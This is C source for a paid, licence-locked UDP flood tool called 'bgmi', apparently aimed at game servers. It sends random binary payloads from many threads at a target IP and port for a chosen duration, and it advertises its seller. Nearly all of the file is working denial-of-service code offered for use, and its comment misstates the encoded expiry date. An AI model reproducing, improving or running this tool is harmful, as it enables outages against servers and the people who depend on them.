#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

#define ENCODED_EXPIRY_DATE { 50, 48, 50, 52, 45, 49, 48, 45, 49, 48 } // Encoded "2024-10-05".

void usage() {
    printf("Usage: ./bgmi ip port time threads\n");
    exit(1);
}

// Function to decode the expiry date
void decode_expiry_date(char *decoded_date) {
    int encoded_date[] = ENCODED_EXPIRY_DATE;
    for (int i = 0; i < 10; i++) {
        decoded_date[i] = (char)encoded_date[i];
    }
    decoded_date[10] = '\0'; // Null-terminate the string
}

// Function to check if the file has expired
int check_expiry() {
    char expiry_date[11];
    decode_expiry_date(expiry_date);

    struct tm expiry_time = {0};
    time_t current_time, expiry_timestamp;

    // Parse the expiration date
    if (strptime(expiry_date, "%Y-%m-%d", &expiry_time) == NULL) {
        fprintf(stderr, "Error parsing expiration date\n");
        return 1;
    }

    // Convert expiration time to timestamp
    expiry_timestamp = mktime(&expiry_time);

    // Get the current time
    time(&current_time);

    // Compare current time with the expiry date
    if (difftime(expiry_timestamp, current_time) <= 0) {
        printf("THIS IS A PAID FILE BY @SAHILMODZOWNER EXPIRED ON %s.\n", expiry_date);
        return 1;
    }

    return 0;  // Not expired
}

struct thread_data {
    char *ip;
    int port;
    int time;
};

// List of payloads
char *payloads[] = {
    "\xe3\x82\x2d\xea\x69\xad\x00\xc7\x7f\xfa\x8d\x79\xd8\x44\x85\x6b\x42\xf8\xda\x8b\x37\x0d\xf3\x7d\xbd\x81\x05\x16\x2f\x65\xe4\xe0\x82\xf1\x76\x09\xab\xb6\xd7\x44\xa1\x7b\x10\xea\xd0\x43\xb4\x75\xc4\xbe\x6f\x41\x85\x16\x2c\xd4\xc4\xe3\x4b\x51\x20\x8b\xea\xdd\xbf\xc4\x40\x26\x66\x6e\x79\x43\x70\x84\x31\xe5\x62\x46\xb8\xf2\xfa\xa0\x51\x08\x7e\x67\x1e\xae\x49\xb6\xe0\x4b\x00\x69\xda\xdb\xae\xf2\x1f\x22\xaf\xa2\x33\x1e\xa8\xa8\x68\x1d\xa2\xdc\x8b\x68\x35\x83\x99\x47\x83\xf3\x23\xbe\x37\x75\xe9\xa6\xda\xfc\x55\x06\x7d\xb0\xdb\x3f\x37\xa7\x32\xf4\x51\xcb\x18\x6e\x6e\xb5\x3e\x12\x66\xd5\xa2\x47\x97\xb8\x60\x4c\x68\xb9\x3d\x06\x08\x51\xe5\x35\x09\xcc\x04\xcc\x16\xc7\x67\xe1\x34\xa3\x73\xb8\x25\x5b\xb6\xd4\x29\x6a\x9a\xbf\x7e\xc8\x14\x74\xfb\x5e\x56\xb1\x4e\xf1\x2a\x57\xa1\x24\x46\x0b\x85\x3a\x21\xa7\xf4\x14\x7d\x63\xd6\x92\xee\xa1\xf7\xbb\x04\x2f\x7c\x18\xa9\xed\x6a\x6f\xb9\xc9\xb2\x93\xe2\x6c\xcc\xd2\x16\xf2\x8d\xdc\x64\xe3\x4b\xc6\x4a\x31\x0d\x2e\xfc\x5b\xb0\xed\x8e\x2a\x6f\x18\x7a\x40\xd4\xda\x87\xf2\xe5\xd1\xeb\x81",
    "\x14\x73\x07\x30\xa3\x43\x0f\x16\x8d\x04\xcd\x00\xb6\x32\x25\x98\xfb\xed\x25\xa5\x86\x95\x8f\xe8\x68\x29\x12\x48\x60\xd3\xc9\xb1\x59\xbf\xbd\x20\xa0\x6b\x34\xfe\x0b\xff\x8e\x64\xc9\x7c\x24\xf6\x75\x81\x4e\xb2\x54\x16\xb8\xc9\x45\x9b\xc7\x9c\xd3\x66\xce\xe8\x6c\xe0\x24\x7a\xf0\x60\x6d\x2e\x24\xbc\xf7\x47\xb7\x62\x02\x1f\x5d\x55\x2d\x33\xa6\xb8\x0c\xf8\x4f\x87\x58\xd6\x44\xe6\xb3\x3f\x68\x88\xbf\xf0\x8a\xe1\xb1\xec\x4e\x4d\x71\x8c\xac\x01\x4b\x02\xf9\xa6\xce\x0e\xfb\x51\xed\x3d\x26\xcd\x82\x95\x44\x06\x85\x14\xf2\x4b\x54\xa5\xf4\xf6\x55\x96\x28\x7a\x67\x54\x74\xfd\x13\x94\xc9\xdc\x91\xc1\x6a\x25\x90\xaa\xbd\xb8\xa6\xcc\x6e\x1b\x0f\xdf\x87\x85\x4b\xb6\x6f\x0c\xd3\x6f\x4e\xc3\x29\x1e\x8f\x8f\x90\xc7\xd2\x20\x23\x73\x66\x1e\x61\x21\x2e\x41\x9e\xa5\xbb\x4e\xbc\xcc\xb3\x0e\xf2\x03\xcf\xff\xa4\x87\xea\x46\x62\x0b\x6c\xce\xf5\xba\xee\x8a\x48\x91\x67\x55\xbc\x94\xb1\x91\x3c\x18\x29\x1c\x99\x55\xe7\x45\x85\xf7\x7e\xea\x42\x0e\xfa\x14\x4f\xe4\xdb\x63\xa0\x4e\xb3\x11\xcc\x47\xd7\x8a\xe3\x08\x57\xe7\xec\x84\x77\xb7\xf0\x7b",
    "\x20\x7e\xc1\x0f\x4a\xfd\x33\x65\xa3\xeb\xed\x71\x8b\xf3\x56\xd8\xa8\xeb\xf7\x99\x0c\x4b\x90\xc2\xcf\xe0\x28\xc3\x54\x0b\x83\xcd\x76\xcd\xfd\xa5\x5a\xbd\x5b\xf8\x15\x16\x71\xc8\x7c\x5b\x82\xd8\x2e\xfe\x40\x1c\x6b\x85\xf9\x0c\xcd\x50\xe4\xaf\xf0\xd7\xa0\x77\xaf\x67\x2e\x4a\x69\x82\x44\x29\x32\x3b\x70\x6a\x67\xf8\x35\xb7\xff\xce\xfd\xf7\x8f\x12\x5b\x05\xde\x6c\x33\x44\xf9\x4f\x48\x1e\xa9\x61\x1c\xa5\x0f\x6a\xea\xdd\x6c\x30\xd4\xff\xea\x2a\xeb\xc9\xff\x67\x65\x05\x7a\xa1\xa2\x0a\x18\x72\x0b\xeb\x77\x26\x44\xe9\xef\x7f\xa4\x59\x70\xb6\x71\xf7\x7e\x67\xd0\xd8\x46\x3b\x07\x0d\x54\xe0\x0d\xfc\xd2\x5c\x08\x7b\xec\x65\x92\xb2\xa1\x91\xc4\x9f\x14\x97\x63\x94\x84\x14\xed\x58\xf7\x70\xf7\xde\xda\x5b\x73\x37\x52\xe7\xef\xef\x62\x2a\x69\x77\x45\xad\x75\x42\xf8\x39\xa3\x98\x43\xf5\xb5\x7b\xfe\x9b\x7e\x23\xd0\xa5\xb3\x71\xad\xe4\xe4\x04\xce\x32\x6f\x6c\xe0\x71\x71\x07\xa4\xae\x56\x32\xb0\xe7\xa3\xc6\x14\x2c\xd1\xcf\x77\x2b\xea\x71\xb9\xaf\xad\xce\x8a\x42\xd4\xb6\x63\xe7\x0a\x25\xe2\xd9\x30\x79\xfc\xa3\x36\xda\x81\xab\xd6\xa6",
    "\x38\x60\xfd\x95\x87\x01\x05\xd3\xa6\x63\xcb\x8b\xf0\x47\x7d\x4f\x46\x50\x0d\xb8\xd4\xea\xa6\x37\x36\xa3\xca\x0c\x42\x0b\x9c\xaa\x52\xb8\xed\xae\xe2\xbd\xa9\x27\xc1\x82\xfe\x8c\xb1\xda\x05\xe6\xbe\xa7\x84\x70\x5f\xf5\x1c\x10\x78\x0c\x01\xe4\xe6\x4e\xf8\x9f\xf7\xa1\xac\x9b\x56\xb7\x5c\xd1\xe4\x61\xf4\xae\x2b\x22\x07\xb1\x64\x48\xbb\x35\xdd\x32\xac\x97\xfc\xc5\x84\xdb\x7e\x12\x38\x89\x0d\x45\x11\x46\x3f\xb2\xc0\x81\x78\x56\xcc\x99\x9e\x80\x7a\x45\x58\xc5\xe8\xa5\xc3\x52\x8f\x7c\x21\x8f\xca\xf9\xc3\xb2\x09\x5e\x0e\xe0\x6b\x6a\xb9\x1f\x56\x6d\xd9\x54\xab\xf3\x76\x4f\x40\x74\x0b\x92\x1e\xf5\xae\x23\x06\x1a\x11\x90\xa9\x9b\xf5\x3d\x2c\x37\x16\x70\x49\x56\xc2\x95\x6f\x35\xe7\x76\x58\x6d\x92\xef\x83\x7c\x86\x3b\xb6\xff\x81\x43\xf8\x28\x9a\x47\xcf\x39\x9c\xb8\x46\x30\x1a\xa5\xbf\xcf\x9a\xfe\x54\x8c\x6a\x6e\xab\x41\xb9\xc4\x2c\xd9\x84\xf0\x8f\x3d\xa6\xf9\x70\x4e\x3f\x2f\xcb\x32\xe3\x2d\x6c\x99\xd4\xc2\xcb\xb1\x81\x0a\xf1\xe7\xc3\x9a\x1b\x76\x04\xf9\xa0\xd2\xd8\x83\x19\x13\x68\xcd\x94\xb6\x71\x17\x54\x91\x04\xb9\x67\x55",
    "\x44\x58\x36\x69\xc5\xe2\x68\x2c\xdb\x62\x7e\xbe\x0e\xca\x8b\xc7\xbb\xe0\xf9\x83\x0d\xac\x39\x8e\x09\xc9\x8e\x22\x89\x82\x0b\x0a\x6d\x08\x07\x9a\x7c\xf6\xf3\x7a\x19\xca\xea\x97\x25\x21\xf1\x1a\x6a\xa1\xd3\x04\x99\x74\xdc\x25\x83\xc3\x06\x37\x4c\x7b\x0f\x4b\x37\x78\x1f\x3f\x03\xd4\x56\xdb\xe9\x61\x24\xc0\x5b\x06\x8c\x9f\x9c\xed\x13\xe0\x0f\x14\x13\xc0\x41\x70\x39\xed\x97\x3c\x65\xbf\xaa\xd4\x06\x5f\xa1\x9f\x3b\xc1\xb7\x9d\x0e\x56\x1b\x8e\x54\x3c\x42\x3b\xba\x5a\x98\x09\xb2\x15\x43\x1d\x8c\x72\xd0\x30\x91\x61\xab\x58\xdb\xe0\x10\xd9\x41\xc2\x72\xe7\xe5\x5e\xa4\x1b\xe9\xea\x98\x17\xc4\x5c\x5d\xc3\x72\x7d\x5b\x62\xc6\xc2\x43\x4e\x64\xf3\xf2\x98\x83\xcd\xc2\x56\x7c\xc9\xaf\x0b\xca\x51\x1a\x16\x59\x8d\x3b\x13\x2e\x3d\x8f\xe0\x0e\x7f\xe1\xd3\x5b\xb7\xa1\xe2\x09\x55\x2e\x44\x79\x6a\x04\x7f\x33\x0d\x10\x93\xb5\xd4\xd5\x6d\x9c\x1c\x8d\x0c\x25\x1b\xc1\xfc\x89\x4d\x3f\x50\xf8\x46\x48\x8e\xf9\xd1\x15\x9e\x08\xed\x7a\x59\x88\xbb\x60\x4c\x14\x07\xae\x80\xfd\xc7\xcb\x94\xb6\xad\x07\x7c\x11\x16\x16\x94\xae\xe9\xb8\xb2\xa6\xdf",
    "\x3e\x71\x55\xaa\x33\x43\x8e\x29\x8d\x51\x81\x37\xf2\x0e\xf0\xd6\x99\xa3\x21\x20\x14\x72\x32\xcb\x21\xc0\xdf\xc4\xe4\x3f\xda\xd9\xc1\x36\x0f\xba\x89\x52\x21\x66\xd0\x34\x59\x01\x2a\xea\xea\x09\x30\xa6\x9d\x30\x5e\xbc\x34\x66\x1e\x6a\xa3\xd8\xb5\xef\x62\xff\xad\x7c\xdf\x72\x30\x05\xe0\xc7\xf0\x85\x16\xd4\xb4\x89\x81\x21\xeb\xdb\xab\x6c\x92\x75\x5b\xed\xe1\x4a\xfb\x7a\x0e\xb8\x2a\xd4\xbb\x13\x85\xac\xf4\x4a\x14\x4c\x4b\x65\x1e\x10\x60\xdc\xae\xd8\xf1\xc7\x20\x99\xae\x3c\xdc\xe0\x42\xac\xe4\x29\xd2\x3a\xbf\xe3\x82\x45\x53\x7a\xba\x8b\xdd\xa5\xcd\xba\x52\x7b\xf1\x9c\x46\x08\x86\x76\xf9\x4e\xbf\x97\x0e\x54\xc9\x5e\x83\x17\x45\xa3\xfc\x52\xad\xa3\xe0\x3f\xdb\x6c\x77\x39\x76\xad\xe8\x97\x82\xfa\x9a\xb6\x29\x4c\xf8\x48\x38\x8f\x53\x8d\x99\x07\xde\x3b\x5f\xd0\x5a\x57\x07\x20\x6c\x56\x81\x98\x57\x90\x41\xe8\x84\xaf\x32\x25\x4a\x70\x0a\xa9\x83\x32\x8e\x62\x41\x22\x4d\x91\x26\x12\x25\x4a\x5d\xac\x24\x1d\x36\x42\xc4\xd1\xd7\xf1\xa7\x13\x4d\x71\xd8\xcc\x4c\xdb\x65\x1c\xc3\x12\x83\xb9\x61\xf9\x65\x38\xae\xf3\xc9\x52\x26\x00",
    "\x70\x38\x0f\x39\xd1\xc3\x57\xe8\x01\xaa\xd7\x4d\x94\xca\x18\xe9\x7c\xb1\x02\xf2\x22\x4f\x04\xc6\xbe\x63\xb6\x87\x8f\xf0\x61\xc9\xc5\x6b\x9c\x51\xb8\xa6\x42\x89\xf5\x2b\xbd\x9a\x67\x93\x60\x70\xd8\x8a\x42\x82\x15\xe9\xc3\xdb\xa2\x66\x45\xb1\xf4\xfe\xef\x1f\x63\xf5\x29\x19\x5c\xa9\xf3\x02\xcd\x9c\x8a\xc9\x0e\xed\x37\x76\x20\xf4\x70\xd5\xa2\xec\xe3\x7c\xab\xed\x70\x43\x37\xff\xd3\xcb\xd5\x6a\x5f\x1d\x2a\x60\x8d\x66\x27\x21\x86\x15\xf2\x4f\xab\x7f\x91\x56\x4e\xec\xbc\xcb\x97\xae\xe8\x1c\xe1\x4d\x4c\x1c\x58\x7e\x9f\xc9\x9c\xd0\x0a\x27\x2f\xd9\xd3\x8c\x03\x48\x47\x53\x12\x4f\xb4\xa7\x7d\x63\x78\x0a\x81\x7b\x3e\xd6\x08\xcb\x71\xa3\x94\x47\xb6\xf9\x5a\x16\x39\x60\xac\xf3\xe4\x92\xd5\x88\x4e\x06\x0c\x0a\x1e\x7b\xe3\x7e\x88\x24\xe3\xb9\xff\xb5\x5d\x7c\x8c\x57\x9d\xac\x15\x9c\xcd\xf5\x1d\xe4\x35\xee\xc8\x8d\xd4\xf3\x84\xca\x9f\x98\x85\xa3\x84\xee\x13\xd6\x4d\x9c\x39\xcc\xb8\x35\xd4\x62\x5f\x5d\x01\x82\xb8\x46\xd7\x4c\x75\xf6\x19\x0f\x46\x7b\x5a\xb2\x34\x3f\xb4\xf3\x0b\xfa\x86\x52\xd4\xfb\xf8\x8f\xdf\xbc\x81\x09\x95\x19",
};

void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;

    // Create a UDP socket
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    // Send packets for the specified duration
    time_t endtime = time(NULL) + data->time;
    while (time(NULL) <= endtime) {

        int random_index = rand() % (sizeof(payloads) / sizeof(payloads[0]));
        if (sendto(sock, payloads[random_index], strlen(payloads[random_index]), 0,
                   (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            perror("Send failed");
            close(sock);
            pthread_exit(NULL);
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    // Check if the file has expired
    if (check_expiry()) {
        exit(1);
    }

    if (argc != 5) {
        usage();
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    int threads = atoi(argv[4]);

    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    struct thread_data data = {ip, port, time};

    printf("Attack started on %s:%d for %d seconds with %d threads\n", ip, port, time, threads);

    // Start attack threads
    for (int i = 0; i < threads; i++) {
        struct thread_data *thread_data_copy = malloc(sizeof(struct thread_data));
        memcpy(thread_data_copy, &data, sizeof(struct thread_data));

        if (pthread_create(&thread_ids[i], NULL, attack, (void *)thread_data_copy) != 0) {
            perror("Thread creation failed");
            free(thread_ids);
            exit(1);
        }
    }

    // Join all attack threads
    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    free(thread_ids);
    printf("Attack finished, join @SahilModz\n");
    return 0;
}
